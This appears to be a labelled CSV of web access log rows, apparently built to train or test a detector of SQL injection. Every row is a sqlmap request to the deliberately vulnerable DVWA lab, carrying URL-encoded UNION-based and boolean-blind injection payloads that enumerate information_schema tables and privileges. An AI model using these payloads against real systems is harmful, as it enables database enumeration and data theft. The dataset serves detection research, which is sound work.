ip,identity,user,timestamp,request,status,size,referer,user_agent,vulnerability,method,url,protocol,request_length,url_parts,user_agent_length,Predicted_Vulnerability
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28CHARACTER_SET_CLIENT%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28COLLATION_CONNECTION%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28CREATED%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28DATABASE_COLLATION%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EVENT_BODY%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EVENT_CATALOG%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EVENT_COMMENT%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EVENT_DEFINITION%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EVENT_NAME%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EVENT_SCHEMA%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EVENT_TYPE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EXECUTE_AT%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28INTERVAL_FIELD%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28INTERVAL_VALUE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28LAST_ALTERED%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28LAST_EXECUTED%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28ON_COMPLETION%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28ORIGINATOR%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28SQL_MODE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28TIME_ZONE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60DEFINER%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60ENDS%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60STARTS%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60STATUS%60%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.%60EVENTS%60%20ORDER%20BY%20%60ENDS%60%23&Submit=Submit HTTP/1.1,200,578,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28CHARACTER_SET_CLIENT%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28COLLATION_CONNECTION%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28CREATED%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28DATABASE_COLLATION%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EVENT_BODY%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EVENT_CATALOG%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EVENT_COMMENT%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EVENT_DEFINITION%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EVENT_NAME%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EVENT_SCHEMA%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EVENT_TYPE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EXECUTE_AT%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28INTERVAL_FIELD%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28INTERVAL_VALUE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28LAST_ALTERED%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28LAST_EXECUTED%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28ON_COMPLETION%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28ORIGINATOR%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28SQL_MODE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28TIME_ZONE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60DEFINER%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60ENDS%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60STARTS%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60STATUS%60%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.%60EVENTS%60%20ORDER%20BY%20%60ENDS%60%23&Submit=Submit,HTTP/1.1,1951,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28CHARACTER_SET_CLIENT%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28COLLATION_CONNECTION%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28CREATED%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28DATABASE_COLLATION%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EVENT_BODY%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EVENT_CATALOG%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EVENT_COMMENT%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EVENT_DEFINITION%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EVENT_NAME%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EVENT_SCHEMA%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EVENT_TYPE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EXECUTE_AT%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28INTERVAL_FIELD%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28INTERVAL_VALUE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28LAST_ALTERED%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28LAST_EXECUTED%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28ON_COMPLETION%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28ORIGINATOR%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28SQL_MODE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28TIME_ZONE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60DEFINER%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60ENDS%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60STARTS%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60STATUS%60%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.%60EVENTS%60%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28CHARACTER_SET_CLIENT%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28COLLATION_CONNECTION%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28CREATED%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28DATABASE_COLLATION%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EVENT_BODY%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EVENT_CATALOG%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EVENT_COMMENT%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EVENT_DEFINITION%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EVENT_NAME%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EVENT_SCHEMA%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EVENT_TYPE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28EXECUTE_AT%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28INTERVAL_FIELD%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28INTERVAL_VALUE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28LAST_ALTERED%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28LAST_EXECUTED%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28ON_COMPLETION%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28ORIGINATOR%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28SQL_MODE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28TIME_ZONE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60DEFINER%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60ENDS%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60STARTS%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60STATUS%60%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.%60EVENTS%60%23&Submit=Submit,HTTP/1.1,1925,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CCHARACTER_SET_CLIENT%2CCOLLATION_CONNECTION%2CCREATED%2CDATABASE_COLLATION%2CEVENT_BODY%2CEVENT_CATALOG%2CEVENT_COMMENT%2CEVENT_DEFINITION%2CEVENT_NAME%2CEVENT_SCHEMA%2CEVENT_TYPE%2CEXECUTE_AT%2CINTERVAL_FIELD%2CINTERVAL_VALUE%2CLAST_ALTERED%2CLAST_EXECUTED%2CON_COMPLETION%2CORIGINATOR%2CSQL_MODE%2CTIME_ZONE%2C%60DEFINER%60%2C%60ENDS%60%2C%60STARTS%60%2C%60STATUS%60%29%29%2C0x716a707171%29%20FROM%20information_schema.%60EVENTS%60%20ORDER%20BY%20%60ENDS%60%23&Submit=Submit HTTP/1.1,200,578,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CCHARACTER_SET_CLIENT%2CCOLLATION_CONNECTION%2CCREATED%2CDATABASE_COLLATION%2CEVENT_BODY%2CEVENT_CATALOG%2CEVENT_COMMENT%2CEVENT_DEFINITION%2CEVENT_NAME%2CEVENT_SCHEMA%2CEVENT_TYPE%2CEXECUTE_AT%2CINTERVAL_FIELD%2CINTERVAL_VALUE%2CLAST_ALTERED%2CLAST_EXECUTED%2CON_COMPLETION%2CORIGINATOR%2CSQL_MODE%2CTIME_ZONE%2C%60DEFINER%60%2C%60ENDS%60%2C%60STARTS%60%2C%60STATUS%60%29%29%2C0x716a707171%29%20FROM%20information_schema.%60EVENTS%60%20ORDER%20BY%20%60ENDS%60%23&Submit=Submit,HTTP/1.1,627,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.%60EVENTS%60%23&Submit=Submit HTTP/1.1,200,1787,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.%60EVENTS%60%23&Submit=Submit,HTTP/1.1,237,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.%60EVENTS%60%29%2C1%2C1%29%29%3E51%23&Submit=Submit HTTP/1.1,200,1810,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.%60EVENTS%60%29%2C1%2C1%29%29%3E51%23&Submit=Submit,HTTP/1.1,222,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.%60EVENTS%60%29%2C1%2C1%29%29%3E48%23&Submit=Submit HTTP/1.1,200,1811,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.%60EVENTS%60%29%2C1%2C1%29%29%3E48%23&Submit=Submit,HTTP/1.1,222,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.%60EVENTS%60%29%2C1%2C1%29%29%3E9%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.%60EVENTS%60%29%2C1%2C1%29%29%3E9%23&Submit=Submit,HTTP/1.1,221,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.%60EVENTS%60%29%2C1%2C1%29%29%3E47%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.%60EVENTS%60%29%2C1%2C1%29%29%3E47%23&Submit=Submit,HTTP/1.1,222,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.%60EVENTS%60%29%2C2%2C1%29%29%3E51%23&Submit=Submit HTTP/1.1,200,1811,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.%60EVENTS%60%29%2C2%2C1%29%29%3E51%23&Submit=Submit,HTTP/1.1,222,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.%60EVENTS%60%29%2C2%2C1%29%29%3E48%23&Submit=Submit HTTP/1.1,200,1811,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.%60EVENTS%60%29%2C2%2C1%29%29%3E48%23&Submit=Submit,HTTP/1.1,222,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.%60EVENTS%60%29%2C2%2C1%29%29%3E9%23&Submit=Submit HTTP/1.1,200,1810,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.%60EVENTS%60%29%2C2%2C1%29%29%3E9%23&Submit=Submit,HTTP/1.1,221,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x434f4c554d4e5f50524956494c45474553%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit HTTP/1.1,200,1975,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2Ccolumn_name%2Ccolumn_type%29%29%2C0x716a707171%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x434f4c554d4e5f50524956494c45474553%20AND%20table_schema%3D0x696e666f726d6174696f6e5f736368656d61%23&Submit=Submit,HTTP/1.1,375,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CGRANTEE%2CIS_GRANTABLE%2CPRIVILEGE_TYPE%2CTABLE_CATALOG%2CTABLE_SCHEMA%2C%60COLUMN_NAME%60%2C%60TABLE_NAME%60%29%29%2C0x716a707171%29%20FROM%20information_schema.COLUMN_PRIVILEGES%23&Submit=Submit HTTP/1.1,200,1838,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CGRANTEE%2CIS_GRANTABLE%2CPRIVILEGE_TYPE%2CTABLE_CATALOG%2CTABLE_SCHEMA%2C%60COLUMN_NAME%60%2C%60TABLE_NAME%60%29%29%2C0x716a707171%29%20FROM%20information_schema.COLUMN_PRIVILEGES%23&Submit=Submit,HTTP/1.1,347,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28GRANTEE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28IS_GRANTABLE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28PRIVILEGE_TYPE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28TABLE_CATALOG%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28TABLE_SCHEMA%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60COLUMN_NAME%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60TABLE_NAME%60%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.COLUMN_PRIVILEGES%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28GRANTEE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28IS_GRANTABLE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28PRIVILEGE_TYPE%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28TABLE_CATALOG%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28TABLE_SCHEMA%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60COLUMN_NAME%60%20AS%20CHAR%29%2C0x20%29%2C0x656e65647272%2CIFNULL%28CAST%28%60TABLE_NAME%60%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.COLUMN_PRIVILEGES%23&Submit=Submit,HTTP/1.1,685,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CGRANTEE%2CIS_GRANTABLE%2CPRIVILEGE_TYPE%2CTABLE_CATALOG%2CTABLE_SCHEMA%2C%60COLUMN_NAME%60%2C%60TABLE_NAME%60%29%29%2C0x716a707171%29%20FROM%20information_schema.COLUMN_PRIVILEGES%23&Submit=Submit HTTP/1.1,200,1838,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CJSON_ARRAYAGG%28CONCAT_WS%280x656e65647272%2CGRANTEE%2CIS_GRANTABLE%2CPRIVILEGE_TYPE%2CTABLE_CATALOG%2CTABLE_SCHEMA%2C%60COLUMN_NAME%60%2C%60TABLE_NAME%60%29%29%2C0x716a707171%29%20FROM%20information_schema.COLUMN_PRIVILEGES%23&Submit=Submit,HTTP/1.1,347,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:02-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.COLUMN_PRIVILEGES%23&Submit=Submit HTTP/1.1,200,1794,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71766b7871%2CIFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%2C0x716a707171%29%20FROM%20information_schema.COLUMN_PRIVILEGES%23&Submit=Submit,HTTP/1.1,242,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:41:03-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.COLUMN_PRIVILEGES%29%2C1%2C1%29%29%3E51%23&Submit=Submit HTTP/1.1,200,1818,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20OR%20NOT%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28%2A%29%20AS%20CHAR%29%2C0x20%29%20FROM%20information_schema.COLUMN_PRIVILEGES%29%2C1%2C1%29%29%3E51%23&Submit=Submit,HTTP/1.1,227,5,40,SQLi
